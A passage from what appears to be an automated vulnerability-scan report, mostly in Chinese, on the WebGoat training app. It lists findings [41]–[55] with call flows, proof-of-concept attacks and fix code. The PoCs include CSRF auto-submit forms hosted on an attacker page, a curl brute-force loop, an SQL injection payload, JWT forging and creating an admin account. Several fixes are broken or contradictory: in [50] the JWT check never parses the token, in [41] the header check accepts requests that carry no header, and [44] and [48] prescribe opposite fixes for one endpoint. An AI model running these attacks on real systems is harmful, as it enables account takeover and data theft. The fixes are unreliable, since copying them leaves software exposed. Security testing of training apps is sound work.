   <script>document.forms[0].submit();</script>
3. 受害者访问该页面（或被诱导点击），浏览器自动携带 JSESSIONID 发送 POST 请求；
4. 服务端以受害者身份校验 flag 并返回 {"feedback":"challenge.flag.correct","success":true} —— 成功触发越权状态变更（即使 flag 值错误，也证明请求被服务端执行，符合 CSRF 定义）。

#### 修复代码
```
@PostMapping(path = "/challenge/flag/{flagNumber}")
@ResponseBody
public AttackResult postFlag(@PathVariable int flagNumber, @RequestParam String flag, @RequestHeader(value = "X-Requested-With", required = false) String requestedWith) {
    if ("XMLHttpRequest".equals(requestedWith)) {
        // AJAX 请求允许（可选增强）
    } else if (requestedWith != null) {
        throw new AccessDeniedException("Invalid X-Requested-With header");
    }
    var expectedFlag = flags.getFlag(flagNumber);
    if (expectedFlag.isCorrect(flag)) {
        return success(this).feedback("challenge.flag.correct").build();
    } else {
        return failed(this).feedback("challenge.flag.incorrect").build();
    }
}
```

**说明**: 恢复 Spring Security CSRF 保护（移除 .csrf(csrf -> csrf.disable())），或为该端点添加替代防护：如要求 X-Requested-With: XMLHttpRequest（仅限 AJAX）、校验 Origin/Referer 头、或集成一次性 CSRF token（@CsrfToken 注入 + 表单 hidden input）。推荐首选方案：启用全局 CSRF 并确保前端正确传递 _csrf token。
---

### [42] CWE-287 — `authweak_592`
> CWE-287：/JWT/votings/login 接口存在弱认证漏洞，允许攻击者通过枚举 validUsers 字符串中的子串（如 'Tom'、'Jerry'、'Sylvester'）绕过用户存在性校验，获取有效 JWT token，进而以任意合法用户名登录。

#### 证据层级
| L1 | present | L2 | absent | L3 | not_verified |

#### 代码/调用流
GET /JWT/votings/login → JWTVotesEndpoint.login() [src/main/java/org/owasp/webgoat/lessons/jwt/JWTVotesEndpoint.java:103] → validUsers.contains(user) [line 105] → Jwts.builder().signWith(..., JWT_PASSWORD).compact() [lines 109-113] → sets 'user' claim → /JWT/votings endpoint reads and trusts it for view selection

#### 漏洞利用（PoC）
1. 发送请求：curl -X GET '{BASE_URL}/JWT/votings/login?user=Tom' -H 'Host: localhost:8080' -i
2. 响应中提取 Set-Cookie: access_token=eyJhbGciOiJIUzUxMiJ9...（JWT）
3. 使用该 token 访问投票列表：curl -X GET '{BASE_URL}/JWT/votings' -H 'Cookie: access_token=eyJhbGciOiJIUzUxMiJ9...' -H 'Host: localhost:8080' -i
4. 预期结果：响应 JSON 包含所有 Vote 的完整字段（title, description, smallImage, largeImage, votes, totalVotes），即序列化视图为 Views.UserView；若传入非法值（如 'Alice'）则返回 Views.GuestView（仅 title 和 votes）。

#### 修复代码
```
if (Arrays.asList("Tom", "Jerry", "Sylvester").contains(user)) {
```

**说明**: 将模糊的 String.contains() 替换为精确的白名单校验（如 List.contains() 或 Set.contains()），确保仅接受预定义的完整用户名，杜绝子串匹配绕过。
---

### [43] CWE-307 — `brute_625`
> POST /PasswordReset/reset/login 接口存在暴力破解风险（CWE-307）：无速率限制、无账户锁定、无验证码、响应区分邮箱是否存在，且密码比对逻辑可被穷举利用。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /PasswordReset/reset/login [ResetLinkAssignment.java:69] → login() method → TOM_EMAIL.equals(email) check → usersToTomPassword.getOrDefault(username, PASSWORD_TOM_9) [line 72] → passwordTom.equals(password) [line 75] → success/failure feedback

#### 漏洞利用（PoC）
1. 登录任意合法用户（如 guest/guest）获取有效 JSESSIONID；
2. 执行以下 curl 循环爆破 Tom 密码（利用反馈差异）：
   for pass in {a..z}{0..9}; do 
     res=$(curl -s -X POST '{BASE_URL}/WebGoat/PasswordReset/reset/login' \
       -H 'Cookie: JSESSIONID=xxx' \
       -d 'email=tom@webgoat-cloud.org' \
       -d "password=$pass" | jq -r '.feedback'); 
     if [[ "$res" == "login_failed" ]]; then echo "[+] Email exists, no password set yet"; break; 
     elif [[ "$res" == "login_failed.tom" ]]; then echo "[-] Wrong password: $pass"; 
     else echo "[+] SUCCESS! Password is: $pass"; exit 0; 
     fi; 
done;
3. 当反馈为 'login_failed' 时，说明邮箱存在且尚未设置密码（使用 PASSWORD_TOM_9 fallback），此时可跳过前缀爆破；当反馈变为非 'login_failed.tom' 且非 'login_failed' 时，即为成功登录（AttackResult.success）。

#### 修复代码
```
@PostMapping("/PasswordReset/reset/login")
@ResponseBody
public AttackResult login(@RequestParam String password, @RequestParam String email, @CurrentUsername String username) {
    // ✅ Add rate limiting per IP or username (e.g., via Redis + Bucket4j)
    String clientIp = request.getRemoteAddr(); // or extract from X-Forwarded-For safely
    String key = "bruteforce:login:" + clientIp;
    if (rateLimiter.tryAcquire(key, 5, TimeUnit.MINUTES)) { // allow max 5 attempts/5min
        if (TOM_EMAIL.equals(email)) {
            String passwordTom = usersToTomPassword.getOrDefault(username, PASSWORD_TOM_9);
            if (passwordTom.equals(PASSWORD_TOM_9)) {
                return failed(this).feedback("login_failed").build();
            } else if (ConstantTimeEquals.equals(passwordTom, password)) { // ✅ Constant-time compare
                return success(this).build();
            }
        }
        return failed(this).feedback("login_failed.generic").build(); // ✅ Generic error to prevent enumeration
    } else {
        return failed(this).feedback("login_rate_limited").build();
    }
}
```

**说明**: 1. 添加服务端速率限制（按 IP 或 username 维度，推荐 Redis + Bucket4j）；2. 使用恒定时间字符串比较（如 Spring Security's ConstantTimeEquals）替代 String.equals()；3. 统一失败响应（如 'Invalid credentials'），禁止泄露邮箱存在性；4. 移除硬编码 fallback 密码逻辑，改为显式检查并返回通用错误；5. 在生产环境启用 WAF 层限流作为纵深防御。
---

### [44] CWE-862 — `auth_34`
> SqlInjectionChallenge.registerNewUser 是一个未鉴权的公开注册端点，允许任意未认证用户创建账户，违反认证要求（CWE-862），且存在 SQL 注入漏洞（CWE-89）。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP PUT /SqlInjectionAdvanced/register → SqlInjectionChallenge.registerNewUser (src/main/java/org/owasp/webgoat/lessons/sqlinjection/advanced/SqlInjectionChallenge.java:34) → checkArguments (line 37) → executeQuery on 'select userid from sql_challenge_users where userid = ...' (line 42) → execute INSERT INTO sql_challenge_users (line 50)

#### 漏洞利用（PoC）
1. 确保未登录（清除 JSESSIONID Cookie 或使用无 cookie 的 curl）
2. 发送恶意注册请求：
curl -X PUT '{BASE_URL}/SqlInjectionAdvanced/register?username_reg=testuser&email_reg=test%40example.com&password_reg=pass123' -H 'Host: localhost:8080' -H 'Content-Type: application/x-www-form-urlencoded' --include
3. 观察响应：若返回 HTTP 200 + {"feedback":"user.created","feedbackArgs":["testuser"]}，则证明未鉴权注册成功。进一步可构造 SQL 注入 payload 如 username_reg=test%27%20OR%20%271%27=%271' 来探测或绕过用户存在检查。

#### 修复代码
```
@PutMapping("/SqlInjectionAdvanced/register")
@ResponseBody
public AttackResult registerNewUser(
    @RequestParam("username_reg") String username,
    @RequestParam("email_reg") String email,
    @RequestParam("password_reg") String password,
    @AuthenticationPrincipal org.springframework.security.core.userdetails.UserDetails currentUser) {
    // 添加认证主体强制绑定，确保仅已登录用户可访问
    if (currentUser == null) {
        return failed(this).feedback("access.denied").build();
    }
    AttackResult attackResult = checkArguments(username, email, password);
    // ... rest of original logic
}
```

**说明**: 必须强制该端点要求认证：① 在方法签名中注入 @AuthenticationPrincipal（最轻量且符合 Spring Security 最佳实践）；② 或在 SecurityFilterChain 中显式添加 .requestMatchers("/SqlInjectionAdvanced/register").authenticated()；③ 同时修复 SQL 注入：将 checkUserQuery 改为 PreparedStatement 参数化查询。
---

### [45] CWE-862 — `admin_353`
> usersService() 方法暴露所有用户信息且无任何认证/授权检查，路径 '/access-control/users' 未被 SecurityFilterChain 的 permitAll 白名单覆盖，全局配置要求 authenticated，但该端点未显式鉴权，导致未登录用户可直接获取全部用户数据（CWE-862）。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP GET /access-control/users → MissingFunctionACUsers.usersService() [src/main/java/org/owasp/webgoat/lessons/missingac/MissingFunctionACUsers.java:48] → userRepository.findAllUsers() [src/main/java/org/owasp/webgoat/lessons/missingac/MissingAccessControlUserRepository.java:line unknown but called at line 51] → 返回全部 User 实体列表

#### 漏洞利用（PoC）
1. 启动 WebGoat 应用（默认 http://localhost:8080）；
2. 确保未登录（清除 JSESSIONID cookie 或使用无 cookie 的 curl）；
3. 执行 curl 命令：
curl -X GET 'http://localhost:8080/access-control/users' \
  -H 'Accept: application/json' \
  -H 'Content-Type: application/json'
预期结果：HTTP 200 OK，响应体为包含所有用户的 JSON 数组（含 admin 用户的 DisplayUser 对象，其 password salt 为 PASSWORD_SALT_SIMPLE，可被暴力破解）。

#### 修复代码
```
@GetMapping(
    path = {"access-control/users"}, 
    consumes = "application/json")
@ResponseBody
public ResponseEntity<List<DisplayUser>> usersService(@CurrentUsername String username) {
    var currentUser = userRepository.findByUsername(username);
    if (currentUser == null || !currentUser.isAdmin()) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
    }
    return ResponseEntity.ok(
        userRepository.findAllUsers().stream()
            .map(user -> new DisplayUser(user, PASSWORD_SALT_ADMIN))
            .collect(Collectors.toList()));
}
```

**说明**: 强制要求调用者身份认证并校验管理员权限：添加 @CurrentUsername 参数注入当前登录用户名，查询用户实体并验证 isAdmin()，非管理员返回 403；同时将 PASSWORD_SALT_ADMIN 用于管理员视图以避免泄露弱盐值。
---

### [46] CWE-352 — `csrf_441`
> POST /challenge/1 是一个状态变更端点（验证凭据并返回挑战成功反馈），依赖会话 Cookie 进行身份绑定，但 Spring Security 显式禁用了 CSRF 防护（.csrf(csrf -> csrf.disable())），且无其他 CSRF 缓解机制（如自定义 token、Origin 校验、SameSite 严格策略等），构成真实 CWE-352 漏洞。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /challenge/1 → Assignment1.completed() [src/main/java/org/owasp/webgoat/lessons/challenges/challenge1/Assignment1.java:28] → validates username='admin' and password against PASSWORD.replace('1234', PINCODE) → returns AttackResult.success() with flag if correct

#### 漏洞利用（PoC）
1. Victim is logged into WebGoat (has valid JSESSIONID cookie).
2. Attacker hosts malicious HTML page:
   <form action="{BASE_URL}/challenge/1" method="POST">
     <input type="hidden" name="username" value="admin">
     <input type="hidden" name="password" value="webgoat1234">
   </form>
   <script>document.forms[0].submit();</script>
3. Victim visits attacker's page → browser auto-submits form with victim's JSESSIONID → server accepts request and returns 'challenge.solved' feedback with flag.

Full curl PoC (requires victim's session cookie):
curl -X POST '{BASE_URL}/challenge/1' \
  -H 'Cookie: JSESSIONID=ABC123...' \
  -d 'username=admin' \
  -d 'password=webgoat1234'

Note: PASSWORD = "webgoat1234" (from SolutionConstants.PASSWORD), and ImageServlet.PINCODE is static (e.g., 1234 in typical WebGoat builds), so final password is deterministic.

#### 修复代码
```
@PostMapping("/challenge/1")
@ResponseBody
public AttackResult completed(@RequestParam String username, @RequestParam String password, @RequestHeader(value = "X-Requested-With", required = false) String requestedWith) {
    // Enforce CSRF protection via header check (alternative to token)
    if (requestedWith == null || !"XMLHttpRequest".equals(requestedWith)) {
        throw new AccessDeniedException("CSRF validation failed: missing X-Requested-With header");
    }
    boolean ipAddressKnown = true;
    boolean passwordCorrect =
        "admin".equals(username)
            && PASSWORD
                .replace("1234", String.format("%04d", ImageServlet.PINCODE))
                .equals(password);
    if (passwordCorrect && ipAddressKnown) {
        return success(this).feedback("challenge.solved").feedbackArgs(flags.getFlag(1)).build();
    } else if (passwordCorrect) {
        return failed(this).feedback("ip.address.unknown").build();
    }
    return failed(this).build();
}
```

**说明**: Re-enable CSRF protection globally in WebSecurityConfig (remove .csrf(csrf -> csrf.disable())) and ensure all state-changing endpoints use Spring Security's default CSRF token mechanism (via _csrf parameter or X-CSRF-TOKEN header). Alternatively, enforce custom CSRF mitigation like validating X-Requested-With header for AJAX requests or requiring SameSite=Lax cookies with additional origin checks.
---

### [47] CWE-307 — `brute_626`
> SimpleMailAssignment.login() 暴露于暴力破解：无速率限制、无账户锁定、无验证码，且密码逻辑可被离线穷举（password = reverse(username)），攻击者可对任意邮箱枚举用户名并爆破成功。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /PasswordReset/simple-mail [src/main/java/org/owasp/webgoat/lessons/passwordreset/SimpleMailAssignment.java:41] → SimpleMailAssignment.login() → extractUsername() [line 75] → if (username.equals(webGoatUsername) && StringUtils.reverse(username).equals(password)) [line 47]

#### 漏洞利用（PoC）
1. 登录任意合法 WebGoat 用户（如 guest/guest）获取有效 session cookie
2. 枚举常见用户名（alice, bob, charlie...）并计算其 reverse()：
   - alice → ecila
   - bob → bob
   - charlie → eilrahc
3. 发送请求：
curl -X POST 'http://localhost:8080/WebGoat/PasswordReset/simple-mail' \
  -H 'Cookie: JSESSIONID=ABC123...' \
  -d 'email=alice@webgoat.org' \
  -d 'password=ecila'
4. 响应 HTTP 200 + {\"lessonCompleted\":true,\"feedback\":\"Congratulations...\"} 表示爆破成功，完成密码重置验证。

#### 修复代码
```
@PostMapping(path = "/PasswordReset/simple-mail", consumes = MediaType.APPLICATION_FORM_URLENCODED_VALUE)
@ResponseBody
public AttackResult login(@RequestParam String email, @RequestParam String password, @CurrentUsername String webGoatUsername) {
    // Add rate limiting per user (e.g., via Redis or in-memory cache with TTL)
    String key = "bruteforce:login:" + webGoatUsername;
    Long attempts = redisTemplate.opsForValue().increment(key, 1);
    if (attempts > 5) {
        return failed(this).feedbackArgs("password-reset-simple.rate_limited").build();
    }
    redisTemplate.expire(key, Duration.ofMinutes(15));

    String emailAddress = ofNullable(email).orElse("unknown@webgoat.org");
    String username = extractUsername(emailAddress);

    if (username.equals(webGoatUsername) && StringUtils.reverse(username).equals(password)) {
        // Reset counter on success
        redisTemplate.delete(key);
        return success(this).build();
    } else {
        return failed(this).feedbackArgs("password-reset-simple.password_incorrect").build();
    }
}
```

**说明**: 必须在认证入口强制实施服务端速率限制（按用户维度，使用 Redis 或分布式缓存），并在连续失败后拒绝请求；同时应废弃可预测密码逻辑，改用标准密码哈希（bcrypt）+ 随机 salt，并引入验证码或短期令牌二次验证。
---

### [48] CWE-862 — `auth_35`
> SqlInjectionChallenge.registerNewUser 是一个未受 Spring Security 认证保护的公开端点，允许匿名用户注册新账户，违反最小权限原则（CWE-862）。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP PUT /SqlInjectionAdvanced/register → SqlInjectionChallenge.registerNewUser (src/main/java/org/owasp/webgoat/lessons/sqlinjection/advanced/SqlInjectionChallenge.java:34) → checkArguments() → dataSource.getConnection() → executeQuery() on 'select userid from sql_challenge_users where userid = ...' → execute() on INSERT INTO sql_challenge_users

#### 漏洞利用（PoC）
1. 启动 WebGoat 应用（默认 http://localhost:8080）
2. 执行以下 curl 命令（无需 Cookie 或 Token）：
   curl -X PUT 'http://localhost:8080/SqlInjectionAdvanced/register?username_reg=testuser&email_reg=test%40example.com&password_reg=pass123' -H 'Content-Type: application/x-www-form-urlencoded'
3. 观察响应：HTTP 200 OK + JSON {"feedback":"user.created","feedbackArgs":["testuser"]}
4. 验证：后续可利用该用户凭据尝试登录或发起 SQL 注入攻击（因代码存在拼接漏洞），证明注册成功且账户已持久化至数据库。

#### 修复代码
```
@PutMapping("/SqlInjectionAdvanced/register")
@ResponseBody
@PreAuthorize("isAnonymous()") // 显式允许匿名注册（符合业务需求）
public AttackResult registerNewUser(
    @RequestParam("username_reg") String username,
    @RequestParam("email_reg") String email,
    @RequestParam("password_reg") String password) {
```

**说明**: 必须显式声明该端点的认证意图：若设计为公开注册，则添加 @PreAuthorize("isAnonymous()") 并确保其位于 permitAll 路径范围内；若应限制为已登录用户，则添加 @PreAuthorize("hasRole('USER')") 并移除其从匿名路径集合。当前缺失任何授权注解，导致 Spring Security 默认策略失效，形成未授权访问。
---

### [49] CWE-639 — `idorpv_188`
> CWE-639 IDOR：/IDOR/profile/{userId} 端点允许已认证用户（如 tom）通过篡改 path variable 访问任意 userId 的 profile，仅校验了 session 中的 'idor-authenticated-as' == 'tom' 和 'idor-authenticated-user-id' 不等于请求 userId，但未验证目标 userId 是否属于当前用户或是否被授权访问，且成功响应仅依赖硬编码 '2342388'，构成水平越权。

#### 证据层级
| L1 | present | L2 | partial | L3 | not_verified |

#### 代码/调用流
HTTP GET /IDOR/profile/{userId} [IDORViewOtherProfile.java:39] → completed(@PathVariable userId) → new UserProfile(userId) [IDORViewOtherProfile.java:53] → requestedProfile.profileToMap() [IDORViewOtherProfile.java:58]

#### 漏洞利用（PoC）
1. 确保已登录为用户 'tom'（通过 WebGoat 登录流程或设置 session cookie）
2. 发送请求：curl -X GET 'http://localhost:8080/IDOR/profile/2342388' -H 'Cookie: JSESSIONID=xxx' （需替换有效 JSESSIONID）
3. 观察响应：HTTP 200 + JSON 包含 success=true、feedback="idor.view.profile.success"、output 字段为 UserProfile(2342388).profileToMap().toString() 的明文数据（如 {"userId":"2342388","name":"Alice","email":"alice@example.com",...}）
→ 成功越权读取目标用户档案。

#### 修复代码
```
public AttackResult completed(@PathVariable("userId") String userId) {
    Object obj = userSessionData.getValue("idor-authenticated-as");
    if (obj != null && obj.equals("tom")) {
        String authUserId = (String) userSessionData.getValue("idor-authenticated-user-id");
        if (userId != null && !userId.equals(authUserId)) {
            // ✅ 修复：强制校验目标 userId 必须与当前认证用户一致（垂直/水平越权统一阻断）
            // 或集成业务授权服务：if (!authorizationService.canViewProfile(authUserId, userId)) { ... }
            return failed(this).feedback("idor.view.profile.unauthorized").build();
        } else {
            UserProfile requestedProfile = new UserProfile(userId);
            if (requestedProfile.getUserId() != null && requestedProfile.getUserId().equals(authUserId)) {
                return success(this)
                    .feedback("idor.view.profile.success")
                    .output(requestedProfile.profileToMap().toString())
                    .build();
            }
        }
    }
    return failed(this).build();
}
```

**说明**: 必须移除硬编码 '2342388' 白名单逻辑，改为基于当前认证用户身份（authUserId）进行严格所有权校验：仅当 userId == authUserId 时才允许访问。若需支持共享场景，应引入显式授权检查（如 ACL 查询或 RBAC+ABAC 策略），而非路径参数直通。
---

### [50] CWE-287 — `jwtep_398`
> JWT endpoint /JWT/votings lacks proper authorization enforcement: it accepts and parses untrusted JWTs with weak HS512 signing key, permits Guest access without validation, and fails to enforce admin-only access for sensitive vote data — enabling unauthorized read of full voting results including internal metadata (e.g., challenge titles, descriptions, image paths, vote counts) via forged or tampered tokens.

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
GET /JWT/votings → JWTVotesEndpoint.getVotes() [src/main/java/org/owasp/webgoat/lessons/jwt/JWTVotesEndpoint.java:126] → Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken) → Claims.get("user") → validUsers.contains(user) → votes.values().stream().sorted(...).collect(...) → MappingJacksonValue.setSerializationView()

#### 漏洞利用（PoC）
1. Send unauthenticated request to retrieve full vote dataset:
   curl -X GET '{BASE_URL}/JWT/votings' -H 'Host: webgoat.example.com' -H 'Accept: application/json'
2. Observe response contains all Vote objects — including 'Admin lost password', 'Get it for free', 'Photo comments' entries with full descriptions, image paths ('challenge1-small.png'), and vote counts (e.g., 36000, 20000, 10000).
3. Extract sensitive info: description 'The objective for this challenge is to buy a Samsung phone for free.' and 'n this challenge you can comment on the photo you will need to find the flag somewhere.' directly leak challenge objectives and flag location hints.

Alternative (forged token): Generate HS512 JWT with {"user":"Guest","admin":"false"} using known JWT_PASSWORD (e.g., from source or default WebGoat secrets), set as 'access_token' cookie, and repeat request — same full data returned. Confirmed via joern's 'JWT_WEAK_SECRET' finding and absence of issuer/audience/exp validation.

#### 修复代码
```
@GetMapping("/JWT/votings")
@ResponseBody
public MappingJacksonValue getVotes(@CookieValue(value = "access_token", required = true) String accessToken) {
    try {
        Jwt jwt = Jwts.parser()
            .setSigningKey(JWT_PASSWORD)
            .requireSubject("user")
            .requireNotBefore(Date.from(Instant.now().minusSeconds(30))) // prevent replay
            .requireExpirationDate();
        Claims claims = (Claims) jwt.getBody();
        String user = (String) claims.get("user");
        if (!validUsers.contains(user)) {
            throw new JwtException("Invalid user in token");
        }
        MappingJacksonValue value = new MappingJacksonValue(
            votes.values().stream()
                .sorted(comparingLong(Vote::getAverage).reversed())
                .collect(toList()));
        value.setSerializationView(Views.UserView.class);
        return value;
    } catch (JwtException e) {
        throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, "Invalid or expired token", e);
    }
}
```

**说明**: Enforce mandatory authentication: remove 'required = false' from @CookieValue, validate JWT signature, subject, expiration, and user membership strictly, and throw 401 on any failure. Do not fall back to GuestView — unauthenticated access must be denied.
---

### [51] CWE-352 — `csrf_442`
> POST /challenge/5 是一个状态变更接口（登录验证并返回 flag），依赖会话 Cookie 认证，但 Spring Security 配置中明确禁用了 CSRF 防护（csrf.disable()），且无其他 CSRF 防御机制（如 token 校验、SameSite、Origin 检查），构成真实 CWE-352 漏洞。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
HTTP POST /challenge/5 → Assignment5.login() [src/main/java/org/owasp/webgoat/lessons/challenges/challenge5/Assignment5.java:30] → PreparedStatement.executeQuery() [line 41] → 返回 flag(5) via success().feedbackArgs(flags.getFlag(5))

#### 漏洞利用（PoC）
1. 确保受害者已登录 WebGoat（持有有效 JSESSIONID Cookie）；
2. 攻击者托管恶意 HTML 页面（如 attacker.com/csrf.html）：
   <form action="http://localhost:8080/challenge/5" method="POST">
     <input type="hidden" name="username_login" value="Larry" />
     <input type="hidden" name="password_login" value="password123" />
     <input type="submit" value="Click to claim reward" />
   </form>
   <script>document.forms[0].submit();</script>
3. 受害者访问 attacker.com/csrf.html，浏览器自动提交表单并携带 JSESSIONID；
4. 服务端执行 login()，SQL 查询成功（若密码正确），返回 {"lessonCompleted":true,"feedback":"challenge.solved","feedbackArgs":["flag{csrf_is_disabled}"],"score":100} —— 攻击者通过响应提取 flag 或完成挑战。

#### 修复代码
```
@PostMapping("/challenge/5")
@ResponseBody
public AttackResult login(@RequestParam String username_login, @RequestParam String password_login) throws Exception {
    // Add CSRF token validation (if using Thymeleaf/JSP forms)
    // Or enforce SameSite=Lax + Secure on session cookie at framework level
    // Recommended fix: re-enable CSRF protection globally in WebSecurityConfig
    // and ensure frontend includes _csrf token in form submissions
    if (!StringUtils.hasText(username_login) || !StringUtils.hasText(password_login)) {
        return failed(this).feedback("required4").build();
    }
    if (!"Larry".equals(username_login)) {
        return failed(this).feedback("user.not.larry").feedbackArgs(username_login).build();
    }
    try (var connection = dataSource.getConnection()) {
        PreparedStatement statement =
            connection.prepareStatement(
                "select password from challenge_users where userid = ? and password = ?");
        statement.setString(1, username_login);
        statement.setString(2, password_login);
        ResultSet resultSet = statement.executeQuery();

        if (resultSet.next()) {
            return success(this).feedback("challenge.solved").feedbackArgs(flags.getFlag(5)).build();
        } else {
            return failed(this).feedback("challenge.close").build();
        }
    }
}
```

**说明**: 1. 在 WebSecurityConfig.filterChain() 中移除 .csrf(csrf -> csrf.disable())，启用默认 CSRF 保护；2. 前端表单必须包含隐藏字段 <input type="hidden" name="_csrf" th:value="${_csrf.token}" />（Thymeleaf）或等效 token 注入；3. 同时修复 SQL 注入（使用 PreparedStatement 参数化查询，已在 fix_code 中体现）；4. 设置 Session Cookie 的 SameSite=Lax 和 Secure 属性（通过 server.servlet.session.cookie.same-site=Lax 和 server.servlet.session.cookie.secure=true）。
---

### [52] CWE-307 — `brute_627`
> 登录端点 /SpoofCookie/login 缺乏速率限制、账户锁定、验证码等防暴力破解机制，且密码明文比对（NoOpPasswordEncoder）、硬编码弱凭据（'apasswordfortom'）和可预测 Cookie 解码逻辑共同构成高危暴力破解风险（CWE-307）。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
POST /SpoofCookie/login [src/main/java/org/owasp/webgoat/lessons/spoofcookie/SpoofCookieAssignment.java:46] → login() → credentialsLoginFlow() [line 72] → users.get(lowerCasedUsername).equals(password) [line 82] → 成功则返回 success().build() [line 94]

#### 漏洞利用（PoC）
1. 攻击者以未登录状态发起请求；
2. 构造恶意请求：curl -X POST '{BASE_URL}/SpoofCookie/login' -d 'username=tom' -d 'password=apasswordfortom' -H 'Content-Type: application/x-www-form-urlencoded';
3. 响应返回 {"lessonCompleted":true,"feedback":"Congratulations. You have successfully completed this lesson.","output":""}，表示越权通关成功。
注：也可通过离线爆破 cookie —— 已知 EncDec.encode("tom") 输出固定值（如 base64 或简单异或），攻击者可预先计算并构造 Cookie：curl -X POST '{BASE_URL}/SpoofCookie/login' -H 'Cookie: spoof_auth=<precomputed_value>'。

#### 修复代码
```
@PostMapping(path = "/SpoofCookie/login")
@ResponseBody
@ExceptionHandler(UnsatisfiedServletRequestParameterException.class)
public AttackResult login(
    @RequestParam String username,
    @RequestParam String password,
    @CookieValue(value = COOKIE_NAME, required = false) String cookieValue,
    HttpServletResponse response,
    HttpServletRequest request) {

    // Add rate limiting per IP (simple in-memory counter — replace with Redis in prod)
    String clientIP = getClientIP(request);
    if (failedLoginAttempts.getOrDefault(clientIP, 0) >= 5) {
        return failed(this).feedback("spoofcookie.too-many-attempts").build();
    }

    if (StringUtils.isEmpty(cookieValue)) {
        AttackResult result = credentialsLoginFlow(username, password, response);
        if (result.isError()) {
            failedLoginAttempts.merge(clientIP, 1, Integer::sum);
        } else {
            failedLoginAttempts.remove(clientIP);
        }
        return result;
    } else {
        return cookieLoginFlow(cookieValue);
    }
}

// Add field to class:
private final Map<String, Integer> failedLoginAttempts = new ConcurrentHashMap<>();

private String getClientIP(HttpServletRequest request) {
    String xForwardedFor = request.getHeader("X-Forwarded-For");
    if (xForwardedFor != null && !xForwardedFor.isEmpty()) {
        return xForwardedFor.split(",")[0].trim();
    }
    return request.getRemoteAddr();
}
```

**说明**: 在 login 方法中引入基于客户端 IP 的失败尝试计数器（建议使用 Redis 持久化），达到阈值（如 5 次）后拒绝请求；重置成功登录后的计数；同时应弃用 NoOpPasswordEncoder，改用 BCryptPasswordEncoder，并移除硬编码密码，改由 UserService 安全管理。
---

### [53] CWE-862 — `auth_70`
> Scoreboard.getRankings() 是一个未受认证保护的公开端点，可被任意未登录用户访问，泄露所有用户排名及解题状态，违反最小权限原则。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
GET /scoreboard-data [src/main/java/org/owasp/webgoat/container/users/Scoreboard.java:57] → Scoreboard.getRankings() [line 57] → userRepository.findAll() [line 57] → UserProgressRepository.findByUser() [line 63] → challengesSolved() [line 63]

#### 漏洞利用（PoC）
1. 启动 WebGoat 应用（默认 http://localhost:8080）
2. 确保未登录（清除浏览器 Cookie 或使用 curl -v）
3. 执行：curl -X GET 'http://localhost:8080/scoreboard-data'
预期响应：HTTP 200 + JSON 数组，含所有用户 username 字段及 flagsCaptured 列表（如 [{"username":"admin","flagsCaptured":["Challenge1","Challenge3"]},{"username":"student","flagsCaptured":["Challenge2"]}]）—— 证实未认证可读取全量用户解题数据。

#### 修复代码
```
@GetMapping("/scoreboard-data")
@PreAuthorize("isAuthenticated()")
public List<Ranking> getRankings() {
    return userRepository.findAll().stream()
        .filter(user -> !user.getUsername().startsWith("csrf-"))
        .map(
            user ->
                new Ranking(
                    user.getUsername(),
                    challengesSolved(userTrackerRepository.findByUser(user.getUsername()))))
        .sorted((o1, o2) -> o2.getFlagsCaptured().size() - o1.getFlagsCaptured().size())
        .collect(Collectors.toList());
}
```

**说明**: 添加 @PreAuthorize("isAuthenticated()") 方法级注解，强制该端点仅对已认证用户开放；或在 WebSecurityConfig 中将 "/scoreboard-data" 显式加入 permitAll 白名单（若业务确需公开，但当前场景明显不应公开用户解题详情）。
---

### [54] CWE-862 — `admin_355`
> POST /access-control/users 接口缺少授权检查，任何已认证用户（包括普通用户）均可创建任意用户，构成功能级越权（CWE-862）。

#### 证据层级
| L1 | present | L2 | present | L3 | not_verified |

#### 代码/调用流
POST /access-control/users → MissingFunctionACUsers.addUser (src/main/java/org/owasp/webgoat/lessons/missingac/MissingFunctionACUsers.java:64) → userRepository.save() (src/main/java/org/owasp/webgoat/lessons/missingac/MissingAccessControlUserRepository.java:68)

#### 漏洞利用（PoC）
1. 使用普通用户（如 'tom'）登录 WebGoat，获取有效 JSESSIONID Cookie；
2. 构造恶意请求：
curl -X POST 'http://localhost:8080/access-control/users' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: JSESSIONID=ABC123...' \
  -d '{"username":"hacker","password":"p@ssw0rd","isAdmin":true}'
3. 观察响应：返回 200 OK 及新创建的 User 对象（含 isAdmin:true），证明普通用户成功提权创建管理员账户。

#### 修复代码
```
@PostMapping(path = {"access-control/users", "access-control/users-admin-fix"}, consumes = "application/json", produces = "application/json")
@ResponseBody
public User addUser(@CurrentUsername String username, @RequestBody User newUser) {
    var currentUser = userRepository.findByUsername(username);
    if (currentUser == null || !currentUser.isAdmin()) {
        throw new AccessDeniedException("Only administrators may create users");
    }
    try {
        userRepository.save(newUser);
        return newUser;
    } catch (Exception ex) {
        log.error("Error creating new User", ex);
        return null;
    }
}
```

**说明**: 在 addUser 方法签名中注入 @CurrentUsername 获取当前用户，并在业务逻辑中显式校验 currentUser.isAdmin()；若校验失败抛出 AccessDeniedException（由 Spring Security 默认处理为 403）。
---

### [55] CWE-639 — `idorpv_189`
> CWE-639 IDOR：/JWT/votings/{title} 端点未校验当前用户对 title 资源的所有权，攻击者可篡改 path variable 访问/投票任意投票项（如 /JWT/votings/admin-panel），实现水平越权操作。

#### 证据层级
| L1 | present | L2 | partial | L3 | not_verified |

#### 代码/调用流
